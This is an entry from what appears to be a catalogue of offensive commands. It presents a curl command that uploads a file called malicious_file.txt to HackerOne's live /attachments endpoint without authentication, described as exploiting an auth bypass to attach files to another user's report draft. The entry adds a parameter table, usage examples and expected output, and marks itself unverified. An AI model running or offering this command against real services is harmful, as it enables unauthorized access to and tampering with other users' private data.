---
id: cmd-curl-unauth-attachment-upload
data: >-
  curl -X POST https://hackerone.com/attachments -F
  "attachment=@malicious_file.txt" -F "report_id=LAST_UPDATED_DRAFT_ID" --header
  "Content-Type: multipart/form-data"
tags:
  - web-exploit
  - file-upload
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T05:32:13.679Z'
verified: false
validated: true
submitted: true
---
# curl-unauth-attachment-upload

## Command

```bash
curl -X POST https://hackerone.com/attachments -F "attachment=@malicious_file.txt" -F "report_id=LAST_UPDATED_DRAFT_ID" --header "Content-Type: multipart/form-data"
```

## Description

This curl command performs an unauthenticated file upload to the HackerOne /attachments endpoint, exploiting an auth bypass to attach the file to another user's most recently updated report draft. Use it to test or demonstrate unauthorized access in web applications with weak auth on upload features.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `-F "attachment=@malicious_file.txt"` | Uploads the specified local file as form data | Yes |
| `-F "report_id=LAST_UPDATED_DRAFT_ID"` | Targets the report draft ID (use actual ID or rely on default for last updated) | Yes |
| `--header "Content-Type: multipart/form-data"` | Sets the content type for file upload | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://hackerone.com/attachments -F "attachment=@test.txt" -F "report_id=123"
```

### Advanced Usage

```bash
curl -X POST https://hackerone.com/attachments -F "attachment=@malicious_file.txt" -F "report_id=LAST_UPDATED_DRAFT_ID" --header "Content-Type: multipart/form-data" -v
```

## Expected Output

A successful response might look like: {"success": true, "attachment_id": 456, "url": "/attachments/456"}, confirming the upload and attachment without authentication errors.

## Related

- [[Related Procedure|procedures/Exploit-Unauthenticated-Attachment-Upload]]
